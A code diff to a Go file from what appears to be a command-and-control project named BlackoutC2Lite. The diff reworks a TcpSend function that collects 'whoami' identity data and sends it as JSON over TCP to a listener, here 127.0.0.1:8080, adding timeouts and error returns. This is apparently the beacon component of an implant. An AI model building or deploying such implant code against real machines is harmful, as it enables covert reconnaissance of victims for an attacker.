@@ -1,37 +1,37 @@
 package tcp
 
 import (
+	"BlackoutC2Lite/Modules/Execution/Whoami"
 	"encoding/json"
 	"fmt"
 	"net"
-	"BlackoutC2Lite/Modules/Execution/Whoami"
+	"time"
 )
 
 
 
-func TcpSend() {
+func TcpSend() error {
 	userStruct := Whoami.Whoami()
 
-	conn, err := net.Dial("tcp", "127.0.0.1:8080")
-
+	conn, err := net.DialTimeout("tcp", "127.0.0.1:8080", 3*time.Second)
 	if err != nil {
-		panic(err)
+		return fmt.Errorf("connection error: %w", err)
 	}
 	defer conn.Close()
 
 	jsonData, err := json.Marshal(userStruct)
 	if err != nil {
-		fmt.Println("json translate error ", err)
-		return
+		return fmt.Errorf("marshal  error: %w", err)
 	}
 
 	jsonData = append(jsonData, '\n')
+
+	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
 	_, err = conn.Write(jsonData)
 	if err != nil {
-		fmt.Println("tcp sending error", err)
-		return	
+		return fmt.Errorf("tcp sending error: %w", err)
 	}
 
-	fmt.Println("data sending is complated")
-
+	fmt.Println("data sending is competed")
+	return nil
 }
